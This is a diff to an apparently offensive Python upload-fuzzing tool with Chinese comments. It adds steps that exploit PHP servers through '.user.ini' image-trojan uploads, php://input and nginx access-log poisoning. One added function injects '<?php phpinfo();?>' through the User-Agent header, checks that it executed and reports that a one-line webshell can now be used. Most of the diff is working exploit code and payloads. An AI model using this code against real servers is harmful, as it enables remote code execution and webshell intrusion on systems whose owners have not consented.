@@ -265,6 +265,11 @@ class FuzzUpload:
         check_res = self.requests.get(check_url, proxies=proxies)
         if check_res.status_code != 404:
             print('可以上传图片马 .user.ini ', open(file_path).read())
+            return True
+        return False
+
+    def upload3_userini_process_payload(self):
+        ...
 
     def upload3_userini1(self):
         print("Function name:", inspect.currentframe().f_code.co_name)
@@ -279,6 +284,11 @@ class FuzzUpload:
         check_res = self.requests.get(check_url, proxies=proxies)
         if check_res.status_code != 404:
             print('php://input, body发送 <?php phpinfo();?>', open(file_path).read())
+            return True
+        return False
+
+    def upload3_userini1_process_payload(self):
+        return
 
     def upload3_userini2(self):
         print("Function name:", inspect.currentframe().f_code.co_name)
@@ -293,6 +303,19 @@ class FuzzUpload:
         check_res = self.requests.get(check_url, proxies=proxies)
         if check_res.status_code != 404:
             print('/var/log/nginx/access.log .user.ini', open(file_path).read())
+            return True
+        return False
+
+    def upload3_userini2_process_payload(self):
+        headers = {
+            'User-Agent': '<?php phpinfo();?>'
+        }
+        res = self.requests.get(url=url, headers=headers, proxies=proxies)
+        res = self.requests.get(url=url, proxies=proxies)
+        is_success = 'PHP Version' in res.text
+        if is_success:
+            print(f"upload3_userini2_process_payload result:: {is_success}")
+            print('可以使用一句话木马进行请求了')
 
 
 def login():
@@ -318,9 +341,10 @@ if __name__ == '__main__':
     # fuzz_upload.upload1_basic()
     # fuzz_upload.upload2_1_script_language()
     # fuzz_upload.upload2_php5_phtml()
-    # fuzz_upload.upload3_userini()  # 成功后上传图片马即可
-    # fuzz_upload.upload3_userini1()  # 成功后上传图片马即可
-    # fuzz_upload.upload3_userini2()  # 成功后上传图片马即可
+    # 成功后上传图片马即可
+    # if fuzz_upload.upload3_userini(): fuzz_upload.upload3_userini_process_payload()
+    # if fuzz_upload.upload3_userini1(): fuzz_upload.upload3_userini1_process_payload()
+    # if fuzz_upload.upload3_userini2(): fuzz_upload.upload3_userini2_process_payload()
     # b_htaccess = fuzz_upload.upload3_htaccess()  # 成功后上传图片马即可
     # fuzz_upload.upload3_htaccess_only_jpg()  # 成功后上传图片马即可
     # fuzz_upload.upload4_percent00_pass11()
